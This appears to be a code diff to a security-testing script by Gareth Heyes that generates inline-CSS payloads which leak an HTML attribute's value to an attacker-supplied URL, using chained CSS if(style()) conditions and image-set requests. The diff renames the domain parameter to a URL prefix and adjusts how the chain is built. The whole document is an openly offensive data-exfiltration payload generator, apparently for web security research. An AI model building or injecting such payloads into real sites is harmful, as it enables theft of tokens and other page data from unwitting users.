@@ -7,15 +7,15 @@ source: |+
   * This script creates some sample HTML code and inline styles to steal attribute values using only inline styles.
   * It supports 4 parameters that are obtained via a Java input dialog.
   * 1. Attribute - This is the attribute name you want to steal
-  * 2. Domain prefix - This is the domain you want to exfiltrate the data to.
+  * 2. URL prefix - This is the URL you want to exfiltrate the data to.
   * 3. Value - This is either a maximum number to exfiltrate to or a list a comma separated values
   * 4. Default value - This is the default value that should be placed in the attribute value
   * @author Gareth Heyes
   **/
   var attribute = javax.swing.JOptionPane.showInputDialog(null, "Enter attribute you want to steal", "Attribute", javax.swing.JOptionPane.QUESTION_MESSAGE);
   if(attribute == null) return;
-  var domainPrefix = javax.swing.JOptionPane.showInputDialog(null, "Enter domain you want the value sent to", "Domain", javax.swing.JOptionPane.QUESTION_MESSAGE);
-  if(domainPrefix == null) return;
+  var urlPrefix = javax.swing.JOptionPane.showInputDialog(null, "Enter the URL you want the value sent to", "URL", javax.swing.JOptionPane.QUESTION_MESSAGE);
+  if(urlPrefix == null) return;
   var value = javax.swing.JOptionPane.showInputDialog(null, "Enter comma separated list of data or a max numeric value", "Value", javax.swing.JOptionPane.QUESTION_MESSAGE);
   if(value == null) return;
   var defaultValue = javax.swing.JOptionPane.showInputDialog(null, "Enter default value to steal", "Default value", javax.swing.JOptionPane.QUESTION_MESSAGE);
@@ -24,19 +24,19 @@ source: |+
 
   if(value.contains(",")) {
     var values = value.split(",");
-    chain = "url(" + domainPrefix + "/" + values[values.length-1] + ")";
+    chain = "url(" + urlPrefix + "/" + values[values.length-1] + ")";
     if(values.length < 2) return;
 
     for (var i = values.length - 2; i > 0; i--) {
-        chain = String.format("if(style(--val:\"%s\"): url(%s/%s); else: %s)", values[i], domainPrefix, values[i], chain);
+        chain = String.format("if(style(--val:\"%s\"): \"%s/%s\"; else: %s)", values[i], urlPrefix, values[i], chain);
     }
 
-    } else {
-      var maxVal = Integer.parseInt(value);
-      chain = "url(" + domainPrefix + "/" + maxVal + ")";
-      for (var i = maxVal - 1; i > 0; i--) {
-          chain = String.format("if(style(--val:\"%d\"): url(%s/%d); else: %s)", i, domainPrefix, i, chain);
-      }
+  } else {
+    var maxVal = Integer.parseInt(value);
+    chain = "url(" + urlPrefix + "/" + maxVal + ")";
+    for (var i = maxVal - 1; i > 0; i--) {
+        chain = String.format("if(style(--val:\"%d\"): \"%s/%d\"; else: %s)", i, urlPrefix, i, chain);
+    }
   }
 
   var styleStr = String.format("--val: attr(%s); --steal: %s; background: image-set(var(--steal));", attribute, chain);
